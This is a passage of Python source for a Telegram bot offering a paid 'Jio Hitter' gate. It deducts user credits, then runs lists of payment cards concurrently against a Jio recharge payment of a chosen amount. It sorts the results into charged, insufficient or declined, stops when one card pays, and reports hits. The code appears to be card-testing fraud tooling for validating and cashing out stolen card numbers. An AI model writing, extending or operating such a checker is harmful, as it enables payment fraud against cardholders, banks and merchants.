        await asyncio.to_thread(create_user, user_id, username)
        current_credits = await asyncio.to_thread(get_user_credits, user_id)

        if not is_owner_user(user_id) and (current_credits is None or current_credits < 1):
            await message.reply(
                "<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>Iɴsᴜғғɪᴄɪᴇɴᴛ Cʀᴇᴅɪᴛs</b>\n\n"
                "Yᴏᴜ Nᴇᴇᴅ Aᴛ Lᴇᴀsᴛ <b>1 Cʀᴇᴅɪᴛ</b> Tᴏ Usᴇ Tʜɪs Gᴀᴛᴇ.\n"
                "Usᴇ /plan Tᴏ Gᴇᴛ Mᴏʀᴇ.",
                parse_mode="HTML"
            )
            return

        new_balance = current_credits - 1
        await asyncio.to_thread(update_credits, user_id, new_balance)

        logger.info(f"[JIO] User {user_id} deducted 1 credit. Old: {current_credits} -> New: {new_balance}")

    except Exception as e:
        logger.error(f"Failed to process credits for user {user_id}: {e}")
        await message.reply("⚠️ <b>Database Error.</b>\nCould not verify credits. Please try again.", parse_mode="HTML")
        return


    if not is_premium:
        FREE_USAGE[user_id] = FREE_USAGE.get(user_id, 0) + 1


    asyncio.create_task(
        run_jio_check(message, number, amount, valid_cards, user_name, user_id)
    )


async def run_jio_check(message: types.Message, number: str, amount: str, cards: List[str],
                        user_name: str, user_id: int):
    start_time = time.time()
    total_cards = len(cards)
    bot = message.bot


    status_msg = await message.reply(
        f"<b>Gᴀᴛᴇ ➺ Jɪᴏ Hɪᴛᴛᴇʀ [jio]</b>\n"
        f"<b>Pʀᴏɢʀᴇss ➺ 0/{total_cards}</b>\n"
        f"<b>Aᴍᴏᴜɴᴛ ➺ {amount} INR</b>\n"
        f"<b>Sᴛᴀᴛᴜs ➺ Hɪᴛᴛɪɴɢ…</b>\n"
        f"━━━━━━━━━━━━━━━━",
        parse_mode="HTML", disable_web_page_preview=True
    )
    msg_id = status_msg.message_id


    JIO_SESSIONS[msg_id] = {
        "results": [],
        "page": 0,
        "total_cards": total_cards,
        "start_time": start_time,
        "user_name": user_name,
        "user_id": user_id,
        "msg_id": msg_id,
        "amount": f"{amount} INR",
        "gateway": "jio",
        "final_status": "checking",
        "current_card": None,
        "stopped": False,
        "tasks": []
    }


    sem = asyncio.Semaphore(3)

    async def worker(card_str: str):
        async with sem:

            JIO_SESSIONS[msg_id]["current_card"] = card_str
            try:
                _elapsed = round(time.time() - start_time, 2)
                _text = format_page_content(JIO_SESSIONS[msg_id], _elapsed, is_working=True)
                await status_msg.edit_text(_text, parse_mode="HTML", reply_markup=get_keyboard(msg_id))
            except Exception:
                pass

            try:
                res = await process_jio_card(number, amount, card_str)


                JIO_SESSIONS[msg_id]["amount"] = res.get("price") or JIO_SESSIONS[msg_id].get("amount")
                JIO_SESSIONS[msg_id]["gateway"] = res.get("gateway") or JIO_SESSIONS[msg_id].get("gateway", "jio")

                is_hit = res.get("is_hit", False)
                emoji = res["emoji"]


                if is_hit:
                    asyncio.create_task(
                        send_hit_message(
                            bot,
                            res["display"],
                            JIO_SESSIONS[msg_id]["amount"],
                            res.get("gateway") or "jio",
                            user_name,
                            user_id,
                            emoji
                        )
                    )

                result = {
                    "card": card_str,
                    "resp": res["resp"],
                    "status": "approved" if is_hit else "declined",
                    "display": res["display"],
                    "emoji": emoji
                }

            except Exception as e:
                logger.error(f"Worker error: {e}")
                result = {
                    "card": card_str,
                    "resp": "script_error",
                    "status": "error",
                    "display": str(e),
                    "emoji": EMOJI_DECLINED
                }


            JIO_SESSIONS[msg_id]["current_card"] = None
            return result


    tasks = [asyncio.create_task(worker(cc)) for cc in cards]
    JIO_SESSIONS[msg_id]["tasks"] = tasks

    results = []
    pending = set(tasks)
    paid_found = False


    while pending:
        done, pending = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)

        for task in done:
            if task.cancelled():
                continue
            try:
                res = task.result()
                results.append(res)

                if res.get('emoji') == EMOJI_CHARGED:
                    paid_found = True
            except Exception as e:
                logger.error(f"Worker task error: {e}")


        if paid_found:
            for t in pending:
                t.cancel()
            pending = set()


        results.sort(key=lambda x: (
            0 if x['emoji'] == EMOJI_CHARGED else 1 if x['emoji'] == EMOJI_INSUFFICIENT else 2
        ))


        if len(results) % UPDATE_EVERY == 0 or not pending:
            elapsed = round(time.time() - start_time, 2)
            JIO_SESSIONS[msg_id]["results"] = results
            JIO_SESSIONS[msg_id]["elapsed_final"] = elapsed

            still_working = bool(pending) and not JIO_SESSIONS[msg_id].get("stopped")
            text = format_page_content(JIO_SESSIONS[msg_id], elapsed, is_working=still_working)

            try:
                await status_msg.edit_text(text, parse_mode="HTML", reply_markup=get_keyboard(msg_id))
            except TelegramBadRequest:
                pass
            except Exception as e:
                logger.error(f"UI Update error: {e}")


    elapsed_final = round(time.time() - start_time, 2)
    JIO_SESSIONS[msg_id]["elapsed_final"] = elapsed_final
    JIO_SESSIONS[msg_id]["final_status"] = (
        "stopped" if JIO_SESSIONS[msg_id].get("stopped") else "completed"
    )

    final_text = format_page_content(JIO_SESSIONS[msg_id], elapsed_final, is_working=False)

    try:
        await status_msg.edit_text(final_text, parse_mode="HTML", reply_markup=get_keyboard(msg_id))
    except TelegramBadRequest:
        pass


def format_page_content(state: Dict[str, Any], elapsed: float, is_working: bool) -> str:
    results = state["results"]
    page = state["page"]
    start_idx = page * RESULTS_PER_PAGE
    page_results = results[start_idx : start_idx + RESULTS_PER_PAGE]

    amount = state.get('amount', 'N/A')
    gateway = state.get('gateway', 'jio')
    total_cards = state['total_cards']
    progress = f"{len(results)}/{total_cards}"


    has_paid = any(r.get('emoji') == EMOJI_CHARGED for r in results)
    if has_paid:
        status_text = f'Pᴀɪᴅ <tg-emoji emoji-id="{EMOJI_CHARGED}">✅</tg-emoji>'
    elif is_working:
        status_text = 'Hɪᴛᴛɪɴɢ…<tg-emoji emoji-id=\"6154603635981423575\">⏳</tg-emoji>'
    elif state.get('stopped') or state.get('final_status') == 'stopped':
        status_text = f'Sᴛᴏᴘᴘᴇᴅ <tg-emoji emoji-id="{EMOJI_STOP}">🛑</tg-emoji>'
    else:
        status_text = f'Nᴏᴛ Pᴀɪᴅ <tg-emoji emoji-id="{EMOJI_DECLINED}">❌</tg-emoji>'

    text = (
        f"<b>Gᴀᴛᴇ ➺ Jɪᴏ Hɪᴛᴛᴇʀ [{html.escape(str(gateway))}]</b>\n"
        f"<b>Pʀᴏɢʀᴇss ➺ {progress}</b>\n"
        f"<b>Aᴍᴏᴜɴᴛ ➺ {html.escape(amount)}</b>\n"
        f"<b>Sᴛᴀᴛᴜs ➺ {status_text}</b>\n"
        f"━━━━━━━━━━━━━━━━"
    )

    for res in page_results:
        display = res.get('display', 'Unknown')
        emoji = res.get('emoji', EMOJI_DECLINED)

        text += (
            f"\n<code>{res['card']}</code>"
            f"\n<b>{html.escape(display)}</b> <tg-emoji emoji-id=\"{emoji}\">❌</tg-emoji>"
            f"\n━━━━━━━━━━━━━━━━"
        )


    current_card = state.get('current_card')
    if is_working and current_card:
        text += (
            f"\n<code>{current_card}</code>"
            f"\n<b>Pʀᴏᴄᴇssɪɴɢ…</b><tg-emoji emoji-id=\"6154603635981423575\">⏳</tg-emoji>"
            f"\n━━━━━━━━━━━━━━━━"
        )

    return text


def get_keyboard(msg_id: int) -> Optional[InlineKeyboardMarkup]:
    state = JIO_SESSIONS.get(msg_id)
    if not state:
        return None

    total = len(state["results"])
    pages = (total + RESULTS_PER_PAGE - 1) // RESULTS_PER_PAGE if total else 1
    current = state["page"]

    buttons = []
    row = []

    if current > 0:
        row.append(InlineKeyboardButton(text="Back", callback_data=f"jio_prev_{msg_id}"))
    if current < pages - 1:
        row.append(InlineKeyboardButton(text="Next", callback_data=f"jio_next_{msg_id}"))

    if row:
        buttons.append(row)

    running = state.get("final_status") == "checking" and not state.get("stopped")
    if running:
        buttons.append([
            InlineKeyboardButton(
                text="Stop",
                callback_data=f"jio_stop_{msg_id}",
                icon_custom_emoji_id=EMOJI_STOP,
            )
        ])

    if not buttons:
        return None

    return InlineKeyboardMarkup(inline_keyboard=buttons)


@router.callback_query(F.data.startswith("jio_"))
async def jio_callback_handler(callback: types.CallbackQuery):
    data = callback.data
    parts = data.split("_")

    if len(parts) < 3:
        await callback.answer("Invalid callback")
        return

    try:
        msg_id = int(parts[2])
    except ValueError:
        await callback.answer("Invalid ID")
        return

    state = JIO_SESSIONS.get(msg_id)
    if not state:
        await callback.answer("Session expired or not found.", show_alert=True)
        return

    if callback.from_user.id != state['user_id']:
        await callback.answer("⛔ Not your session.", show_alert=True)
        return

    action = parts[1]
    total_results = len(state["results"])
    total_pages = (total_results + RESULTS_PER_PAGE - 1) // RESULTS_PER_PAGE

    if action == "stop":
        state["stopped"] = True
        for t in state.get("tasks", []):
            if not t.done():
                t.cancel()
        await callback.answer("🛑 Stopping…", show_alert=False)
        return

    if action == "next" and state['page'] < total_pages - 1:
        state['page'] += 1
    elif action == "prev" and state['page'] > 0:
        state['page'] -= 1

    await callback.answer()

    elapsed = state.get('elapsed_final', round(time.time() - state['start_time'], 2))
    text = format_page_content(state, elapsed, is_working=False)

    try:
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=get_keyboard(msg_id))
    except TelegramBadRequest:
        pass
